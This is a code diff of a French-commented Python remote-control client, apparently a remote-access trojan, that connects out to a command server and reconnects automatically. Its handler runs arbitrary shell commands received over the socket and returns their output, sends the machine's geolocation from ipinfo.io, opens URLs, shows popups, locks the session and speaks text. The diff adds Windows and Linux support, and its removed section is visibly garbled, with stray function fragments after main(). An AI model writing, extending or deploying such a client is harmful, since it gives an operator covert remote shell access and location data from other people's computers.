@@ -7,6 +7,11 @@ import sys
 import time
 import platform
 import threading
+try:
+    import ctypes  # Pour Windows (verrouillage de session)
+    import pyttsx3  # Pour la synthèse vocale
+except ImportError:
+    pass  # On gère l'absence de ces modules plus tard
 
 # --- CONFIGURATION ---
 HOST = '127.0.0.1'  # Adresse IP du serveur
@@ -26,9 +31,21 @@ def get_local_ip():
     return local_ip
 
 def show_popup(message):
-    """Affiche un message dans le terminal (Termux n'a pas de GUI)."""
-    print(f"\n[POPUP] {message}\n")
-    return "Message affiche dans le terminal"
+    """Affiche un popup selon le système d'exploitation."""
+    system = platform.system()
+    try:
+        if system == "Windows":
+            subprocess.run(['msg', '*', message], check=True)
+        elif system == "Linux":
+            try:
+                subprocess.run(['notify-send', 'Message', message], check=True)
+            except subprocess.CalledProcessError:
+                subprocess.run(['zenity', '--info', '--text', message], check=True)
+        else:
+            print(f"\n[POPUP] {message}\n")
+        return "Popup affichée"
+    except Exception as e:
+        return f"Erreur popup: {str(e)}"
 
 def open_browser(url):
     """Ouvre une URL dans le navigateur par défaut."""
@@ -54,81 +71,13 @@ def run_command(cmd):
     except Exception as e:
         return str(e)
 
-def main():
-    """Fonction principale du client Termux."""
-    print(f"[*] Client Termux actif. Connexion vers {HOST}:{PORT}...")
-
-    while True:  # Boucle de reconnexion automatique
-        try:
-            with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as s:
-                s.connect((HOST, PORT))
-                s.sendall(f"Connecte: {platform.system()} ({get_local_ip()})".encode('utf-8'))
-
-                while True:
-                    command = s.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
-                    if not command:
-                        break
-
-                    print(f"[RECU] Commande : {command}")
-
-                    if command.startswith("popup:"):
-                        threading.Thread(target=show_popup, args=(command[6:],)).start()
-                        s.sendall("OK: Popup affichee".encode('utf-8'))
-
-                    elif command.startswith("browser:"):
-                        webbrowser.open(command[8:])
-                        s.sendall("OK: Navigateur ouvert".encode('utf-8'))
-
-                    elif command == "location":
-                        try:
-                            r = requests.get('https://ipinfo.io/json', timeout=5).text
-                            s.sendall(r.encode('utf-8'))
-                        except Exception:
-                            s.sendall("Erreur localisation".encode('utf-8'))
-
-                    elif command.startswith("cmd:"):
-                        try:
-                            out = subprocess.check_output(command[4:], shell=True, stderr=subprocess.STDOUT)
-                            s.sendall(out if out else b"OK")
-                        except Exception as e:
-                            s.sendall(str(e).encode('utf-8'))
-
-                    elif command == "lock":
-                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))
-
-                    elif command.startswith("speak:"):
-                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))
-
-                    elif command == "screenshot":
-                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))
-
-                    elif command == "exit":
-                        print("[INFO] Deconnexion demandee.")
-                        return
-
-        except ConnectionRefusedError:
-            print("[ERREUR] Impossible de se connecter au serveur. Reessai dans 5 secondes...")
-        except Exception as e:
-            print(f"[ERREUR] {str(e)}")
-        time.sleep(5)
-
-if __name__ == "__main__":
-    main()
-            try:
-                subprocess.run(['notify-send', 'Message', message], check=True)
-            except subprocess.CalledProcessError:
-                subprocess.run(['zenity', '--info', '--text', message], check=True)
-        return "Pop-up affichée"
-    except Exception as e:
-        return f"Erreur popup: {str(e)}"
-
 def lock_session():
     """Verrouille la session utilisateur selon le système d'exploitation."""
     system = platform.system()
     try:
         if system == "Windows":
             ctypes.windll.user32.LockWorkStation()
-        else:
+        elif system == "Linux":
             os.system("xdg-screensaver lock")
         return "Session verrouillée"
     except Exception as e:
@@ -163,18 +112,18 @@ def main():
 
                     if command.startswith("popup:"):
                         threading.Thread(target=show_popup, args=(command[6:],)).start()
-                        s.sendall(b"OK: Popup affichée")
+                        s.sendall("OK: Popup affichée".encode())
 
                     elif command.startswith("browser:"):
                         webbrowser.open(command[8:])
-                        s.sendall(b"OK: Navigateur ouvert")
+                        s.sendall("OK: Navigateur ouvert".encode())
 
                     elif command == "location":
                         try:
                             r = requests.get('https://ipinfo.io/json', timeout=5).text
                             s.sendall(r.encode())
                         except Exception:
-                            s.sendall(b"Erreur localisation")
+                            s.sendall("Erreur localisation".encode())
 
                     elif command.startswith("cmd:"):
                         try:
@@ -188,10 +137,10 @@ def main():
 
                     elif command.startswith("speak:"):
                         threading.Thread(target=speak, args=(command[6:],)).start()
-                        s.sendall(b"OK: Message vocalisé")
+                        s.sendall("OK: Message vocalisé".encode())
 
                     elif command == "screenshot":
-                        s.sendall(b"Fonctionnalité désactivée")
+                        s.sendall("Fonctionnalité désactivée".encode())
 
                     elif command == "exit":
                         print("[INFO] Déconnexion demandée.")
